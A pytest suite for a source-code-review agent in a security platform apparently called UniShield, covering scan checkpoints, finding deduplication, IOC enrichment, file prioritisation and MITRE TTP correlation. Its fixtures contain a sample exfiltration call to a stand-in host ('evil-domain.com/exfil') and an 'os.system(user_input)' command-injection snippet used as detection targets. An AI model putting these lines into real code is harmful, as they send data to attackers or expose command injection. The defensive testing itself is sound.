"""Tests for the SCR agent."""

from __future__ import annotations

from datetime import UTC, datetime

import pytest
import pytest_asyncio
from fakeredis import aioredis as fakeredis

from unishield.agents.scr.schemas.input_schema import SCRAgentInput, ScanMode, TriggerSource
from unishield.agents.scr.scr_agent import SCRAgent
from unishield.agents.scr.stages.stage3_analysis import AnalysisStage
from unishield.infrastructure.kafka_client import KafkaClient
from unishield.memory.personal_memory import PersonalMemoryClient
from unishield.memory.shared_memory import SharedMemoryClient


class MockKafka:
    async def publish(self, topic: str, payload: dict, key: str | None = None) -> None:
        pass


@pytest_asyncio.fixture
async def redis_client():
    client = fakeredis.FakeRedis(decode_responses=True)
    yield client
    await client.aclose()


@pytest_asyncio.fixture
async def scr_agent(redis_client):
    personal = PersonalMemoryClient(redis_client)
    shared = SharedMemoryClient(redis_client)
    kafka = MockKafka()
    return SCRAgent(personal, shared, kafka), personal, shared


def _make_input(**kwargs) -> SCRAgentInput:
    defaults = {
        "request_id": "req-1",
        "client_id": "client-1",
        "triggered_by": TriggerSource.MANUAL,
        "scan_mode": ScanMode.FULL_REPO,
        "workflow_id": "wf-1",
        "file_paths": [
            "src/auth/login.py",
            "src/vulnerable_sql.py",
            "tests/test_auth.py",
            "vendor/lib.py",
        ],
        "crown_jewels": ["src/auth/"],
    }
    defaults.update(kwargs)
    return SCRAgentInput(**defaults)


@pytest.mark.asyncio
async def test_checkpoint_resume(scr_agent, redis_client):
    agent, personal, _ = scr_agent
    scan_id = "scan-checkpoint"

    files = [f"src/file_{i}.py" for i in range(10)]
    input_data = _make_input(file_paths=files)

    await personal.save_scan_progress(scan_id, 10, ["batch-0", "batch-1", "batch-2"], [], "batch-2")
    progress = await personal.load_scan_progress(scan_id)
    assert progress is not None
    assert len(progress["completed_batches"]) == 3
    assert progress["current_batch_id"] == "batch-2"

    completed = set(progress["completed_batches"])
    batches = [files[i : i + 1] for i in range(10)]
    resumed_from = None
    for idx, batch in enumerate(batches):
        batch_id = f"batch-{idx}"
        if batch_id in completed:
            continue
        resumed_from = idx
        break

    assert resumed_from == 3


@pytest.mark.asyncio
async def test_dedup_fingerprinting(scr_agent):
    agent, personal, _ = scr_agent

    finding = {
        "file_path": "src/vulnerable_sql.py",
        "line_start": 10,
        "rule_id": "sql-injection",
        "code_snippet": "SELECT * FROM users",
    }
    fp = AnalysisStage.fingerprint_finding(finding)

    await personal.add_fingerprint("scan-dedup", fp)
    assert await personal.fingerprint_exists("scan-dedup", fp)

    await personal.append_findings("scan-dedup", "batch-0", [finding], [], [])
    await personal.append_findings("scan-dedup", "batch-1", [finding], [], [])

    all_findings = await personal.load_all_findings("scan-dedup")
    seen: set[str] = set()
    unique = []
    for f in all_findings["code"]:
        fp2 = AnalysisStage.fingerprint_finding(f)
        if fp2 not in seen:
            seen.add(fp2)
            unique.append(f)

    assert len(unique) == 1


@pytest.mark.asyncio
async def test_ioc_enrichment(scr_agent, redis_client):
    agent, personal, shared = scr_agent
    workflow_id = "wf-ioc"

    await shared.write_agent_output(
        workflow_id,
        "UniShield-Web",
        {"ioc_list": ["evil-domain.com"], "threat_actor_ttps": []},
    )

    finding = {
        "finding_id": "f-1",
        "file_path": "src/api.py",
        "line_start": 5,
        "code_snippet": "requests.get('http://evil-domain.com/exfil')",
        "severity": "MEDIUM",
        "category": "network",
        "language": "python",
        "line_end": 5,
        "column_start": 0,
        "column_end": 50,
        "confidence": 0.8,
    }
    await personal.append_findings("scan-ioc", "batch-0", [finding], [], [])

    input_data = _make_input(workflow_id=workflow_id, ioc_list=["evil-domain.com"])
    await agent._stage8_threat_intel("scan-ioc", input_data)

    all_findings = await personal.load_all_findings("scan-ioc")
    severities = [f.get("severity") for f in all_findings["code"]]
    assert "CRITICAL" in severities


@pytest.mark.asyncio
async def test_priority_queue_order(scr_agent):
    agent, _, _ = scr_agent
    files = [
        "tests/test_utils.py",
        "vendor/lib.py",
        "src/auth/login.py",
        "src/utils.py",
    ]
    input_data = _make_input(crown_jewels=["src/auth/"])

    ordered = agent._build_priority_queue(files, input_data)
    assert ordered[0] == "src/auth/login.py"
    assert "tests/" in ordered[-1] or "vendor/" in ordered[-1]


@pytest.mark.asyncio
async def test_threat_intel_correlation(scr_agent, redis_client):
    agent, personal, shared = scr_agent
    workflow_id = "wf-ttp"

    await shared.write_agent_output(
        workflow_id,
        "UniShield-Web",
        {"ioc_list": [], "threat_actor_ttps": ["T1059.001"]},
    )

    finding = {
        "finding_id": "f-2",
        "file_path": "src/exec.py",
        "line_start": 1,
        "code_snippet": "os.system(user_input)  # T1059.001 command execution",
        "severity": "HIGH",
        "category": "execution",
        "language": "python",
        "line_end": 1,
        "column_start": 0,
        "column_end": 40,
        "confidence": 0.9,
    }
    await personal.append_findings("scan-ttp", "batch-0", [finding], [], [])

    input_data = _make_input(
        workflow_id=workflow_id,
        threat_actor_ttps=["T1059.001"],
    )
    await agent._stage8_threat_intel("scan-ttp", input_data)

    all_findings = await personal.load_all_findings("scan-ttp")
    critical = [f for f in all_findings["code"] if f.get("severity") == "CRITICAL"]
    assert len(critical) >= 1
    assert critical[0].get("mitre_technique") == "T1059.001"
